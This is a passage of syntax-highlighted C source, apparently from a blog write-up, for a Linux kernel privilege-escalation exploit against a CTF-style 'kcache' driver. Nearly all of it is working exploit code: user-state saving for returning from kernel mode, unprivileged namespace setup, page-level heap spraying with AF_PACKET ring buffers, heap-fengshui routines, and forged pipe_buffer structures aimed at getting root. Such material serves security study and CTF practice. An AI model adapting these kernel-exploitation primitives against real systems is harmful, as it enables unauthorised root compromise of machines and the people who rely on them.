class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sysinfo.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">randint</span><span class="params">(<span class="type">int</span> min, <span class="type">int</span> max)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> min + (rand() % (max - min));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">bool</span> fixed, <span class="type">bool</span> thread)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(fixed ? <span class="number">0</span> : randint(<span class="number">1</span>, get_nprocs()), &amp;cpu_set);</span><br><span class="line">    <span class="keyword">if</span> (thread) &#123;</span><br><span class="line">        pthread_setaffinity_np(pthread_self(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">qword_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] %s:\n&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">byte_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">unsigned</span> <span class="type">char</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] %s:\n&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i += <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len ? <span class="built_in">printf</span>(<span class="string">&quot; %02x&quot;</span>, buf8[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span> &amp;&amp; j + i &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i + j]) ? buf8[i + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_kernel_text_addr</span><span class="params">(<span class="type">size_t</span> addr)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> addr &gt;= <span class="number">0xFFFFFFFF80000000</span> &amp;&amp; addr &lt;= <span class="number">0xFFFFFFFFFEFFFFFF</span>;</span><br><span class="line"><span class="comment">//    return addr &gt;= 0xFFFFFFFF80000000 &amp;&amp; addr &lt;= 0xFFFFFFFF9FFFFFFF;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_dir_mapping_addr</span><span class="params">(<span class="type">size_t</span> addr)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> addr &gt;= <span class="number">0xFFFF888000000000</span> &amp;&amp; addr &lt;= <span class="number">0xFFFFc87FFFFFFFFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief create an isolate namespace</span></span><br><span class="line"><span class="comment"> * note that the caller **SHOULD NOT** be used to get the root, but an operator</span></span><br><span class="line"><span class="comment"> * to perform basic exploiting operations in it only</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">unshare_setup</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> tmp_fd;</span><br><span class="line"></span><br><span class="line">    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">    write(tmp_fd, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getuid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getgid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * III -  pgv pages sprayer related</span></span><br><span class="line"><span class="comment"> * not that we should create two process:</span></span><br><span class="line"><span class="comment"> * - the parent is the one to send cmd and get root</span></span><br><span class="line"><span class="comment"> * - the child creates an isolate userspace by calling unshare_setup(),</span></span><br><span class="line"><span class="comment"> *      receiving cmd from parent and operates it only</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_PAGE_NUM 1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACKET_VERSION 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACKET_TX_RING 13</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_nr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">int</span> cmd;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* operations type */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    CMD_ALLOC_PAGE,</span><br><span class="line">    CMD_FREE_PAGE,</span><br><span class="line">    CMD_EXIT,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* tpacket version for setsockopt */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">tpacket_versions</span> &#123;</span></span><br><span class="line">    TPACKET_V1,</span><br><span class="line">    TPACKET_V2,</span><br><span class="line">    TPACKET_V3,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pipe for cmd communication */</span></span><br><span class="line"><span class="type">int</span> cmd_pipe_req[<span class="number">2</span>], cmd_pipe_reply[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* create a socket and alloc pages, return the socket fd */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">create_socket_and_alloc_pages</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">unsigned</span> <span class="type">int</span> nr)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="type">int</span> socket_fd, version;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</span><br><span class="line">    <span class="keyword">if</span> (socket_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n&quot;</span>);</span><br><span class="line">        ret = socket_fd;</span><br><span class="line">        <span class="keyword">goto</span> err_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    version = TPACKET_V1;</span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION,</span><br><span class="line">                     &amp;version, <span class="keyword">sizeof</span>(version));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_setsockopt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    req.tp_block_size = size;</span><br><span class="line">    req.tp_block_nr = nr;</span><br><span class="line">    req.tp_frame_size = <span class="number">0x1000</span>;</span><br><span class="line">    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;</span><br><span class="line"></span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_TX_RING)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_setsockopt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> socket_fd;</span><br><span class="line"></span><br><span class="line">    err_setsockopt:</span><br><span class="line">    close(socket_fd);</span><br><span class="line">    err_out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the parent process should call it to send command of allocation to child */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">alloc_page</span><span class="params">(<span class="type">int</span> idx, <span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">unsigned</span> <span class="type">int</span> nr)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">            .idx = idx,</span><br><span class="line">            .cmd = CMD_ALLOC_PAGE,</span><br><span class="line">            .size = size,</span><br><span class="line">            .nr = nr,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pgv_page_request));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the parent process should call it to send command of freeing to child */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">free_page</span><span class="params">(<span class="type">int</span> idx)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">            .idx = idx,</span><br><span class="line">            .cmd = CMD_FREE_PAGE,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line">    usleep(<span class="number">10000</span>);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the child, handler for commands from the pipe */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_cmd_handler</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="type">int</span> socket_fd[PGV_PAGE_NUM];</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* create an isolate namespace*/</span></span><br><span class="line">    unshare_setup();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* handler request */</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        read(cmd_pipe_req[<span class="number">0</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (req.cmd == CMD_ALLOC_PAGE) &#123;</span><br><span class="line">            ret = create_socket_and_alloc_pages(req.size, req.nr);</span><br><span class="line">            socket_fd[req.idx] = ret;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (req.cmd == CMD_FREE_PAGE) &#123;</span><br><span class="line">            ret = close(socket_fd[req.idx]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] invalid request: %d\n&quot;</span>, req.cmd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        write(cmd_pipe_reply[<span class="number">1</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line">    &#125; <span class="keyword">while</span> (req.cmd != CMD_EXIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* init pgv-exploit subsystem :) */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">prepare_pgv_system</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="comment">/* pipe for pgv */</span></span><br><span class="line">    pipe(cmd_pipe_req);</span><br><span class="line">    pipe(cmd_pipe_reply);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* child process for pages spray */</span></span><br><span class="line">    <span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">        spray_cmd_handler();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * IV - config for page-level heap spray and heap fengshui</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_SPRAY_NUM 200</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_1PAGE_SPRAY_NUM 0x20</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_4PAGES_START_IDX PGV_1PAGE_SPRAY_NUM</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_4PAGES_SPRAY_NUM 0x40</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_8PAGES_START_IDX (PGV_4PAGES_START_IDX + PGV_4PAGES_SPRAY_NUM)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_8PAGES_SPRAY_NUM 0x40</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> pgv_1page_start_idx = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> pgv_4pages_start_idx = PGV_4PAGES_START_IDX;</span><br><span class="line"><span class="type">int</span> pgv_8pages_start_idx = PGV_8PAGES_START_IDX;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* spray pages in different size for various usages */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">prepare_pgv_pages</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * We want a more clear and continuous memory there, which require us to</span></span><br><span class="line"><span class="comment">     * make the noise less in allocating order-3 pages.</span></span><br><span class="line"><span class="comment">     * So we pre-allocate the pages for those noisy objects there.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-0 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_1PAGE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (alloc_page(i, <span class="number">0x1000</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-2 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_4PAGES_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (alloc_page(PGV_4PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">4</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray 8 pages for page-level heap fengshui */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-3 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_8PAGES_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="comment">/* a socket need 1 obj: sock_inode_cache, 19 objs for 1 slub on 4 page*/</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">19</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_4pages_start_idx++);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a socket need 1 dentry: dentry, 21 objs for 1 slub on 1 page */</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">21</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a pgv need 1 obj: kmalloc-8, 512 objs for 1 slub on 1 page*/</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">512</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (alloc_page(PGV_8PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">8</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> kcache_fd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="type">uint32_t</span> size;</span><br><span class="line">    <span class="type">void</span> *buf;</span><br><span class="line">&#125; kcache_cmd;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kcache_alloc</span><span class="params">(<span class="type">int</span> index, <span class="type">uint32_t</span> size, <span class="type">void</span> *buf)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(kcache_fd, <span class="number">0x114</span>, &amp;(kcache_cmd) &#123;index, size, buf&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kcache_write</span><span class="params">(<span class="type">int</span> index, <span class="type">uint32_t</span> size, <span class="type">void</span> *buf)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(kcache_fd, <span class="number">0x514</span>, &amp;(kcache_cmd) &#123;index, size, buf&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kcache_read</span><span class="params">(<span class="type">int</span> index, <span class="type">uint32_t</span> size, <span class="type">void</span> *buf)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(kcache_fd, <span class="number">0x1919</span>, &amp;(kcache_cmd) &#123;index, size, buf&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kcache_free</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(kcache_fd, <span class="number">0x810</span>, &amp;(kcache_cmd) &#123;.index=index&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KCACHE_NUM 0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KCACHE_SIZE 2048</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SND_PIPE_BUF_SZ 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRD_PIPE_BUF_SZ 192</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> pipe_fd[PIPE_SPRAY_NUM][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125; info_pipe_buf, evil_pipe_buf[<span class="number">3</span>];</span><br><span class="line"><span class="type">int</span> orig_pipe_id[<span class="number">2</span>] = &#123;<span class="number">-1</span>, <span class="number">-1</span>&#125;;</span><br><span class="line"><span class="type">int</span> victim_pip_id[<span class="number">2</span>] = &#123;<span class="number">-1</span>, <span class="number">-1</span>&#125;;</span><br><span class="line"><span class="type">int</span> evil_pipe_id[<span class="number">3</span>] = &#123;<span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>&#125;;</span><br><span class="line"><span class="type">size_t</span> page_offset_base = <span class="number">0xffff888000000000</span>;</span><br><span class="line"><span class="type">size_t</span> vmemmap_base = <span class="number">0xffffea0000000000</span>;</span><br><span class="line"><span class="type">size_t</span> kernel_offset;</span><br><span class="line"><span class="type">size_t</span> current_task;</span><br><span class="line"><span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> page *<span class="title function_">direct_map_addr_to_page_addr</span><span class="params">(<span class="type">size_t</span> direct_map_addr)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> page *) (vmemmap_base + ((direct_map_addr &amp; (~<span class="number">0xFFF</span>)) - page_offset_base) / <span class="number">0x1000</span> * 